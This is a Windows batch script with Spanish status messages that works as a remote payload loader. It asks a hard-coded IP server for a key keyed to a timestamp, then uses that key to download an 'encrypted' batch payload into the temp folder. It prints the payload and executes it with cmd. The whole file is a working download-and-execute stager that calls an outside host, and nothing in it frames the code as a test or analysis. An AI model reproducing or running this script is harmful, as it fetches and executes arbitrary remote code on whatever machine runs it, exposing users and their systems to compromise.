@echo off
setlocal

echo [INFO] ===== START =====

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

REM ===== TS =====
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
echo [DEBUG] TS=%TS%

REM ===== GET KEY =====
echo [INFO] Requesting KEY...
for /f "delims=" %%i in ('powershell -NoP -Command "Invoke-RestMethod '%BASE%/auth/key?ts=%TS%'"') do set KEY=%%i

echo [DEBUG] KEY=%KEY%

if "%KEY%"=="" (
    echo [ERROR] KEY vacia
    exit /b 1
)

REM ===== DOWNLOAD PAYLOAD =====
echo [INFO] Downloading payload...
powershell -NoP -Command "Invoke-WebRequest '%BASE%/payload/encrypted' -Headers @{ 'X-Decrypt-Key'='%KEY%' } -OutFile '%FILE%'"

if not exist "%FILE%" (
    echo [ERROR] Payload no descargado
    exit /b 1
)

for %%A in ("%FILE%") do if %%~zA==0 (
    echo [ERROR] Payload vacio
    exit /b 1
)

echo [DEBUG] Payload:
type "%FILE%"

REM ===== EXECUTE =====
echo [INFO] Ejecutando payload...
cmd /c "%FILE%"

echo [INFO] Exit code: %errorlevel%
echo [INFO] ===== END =====

endlocal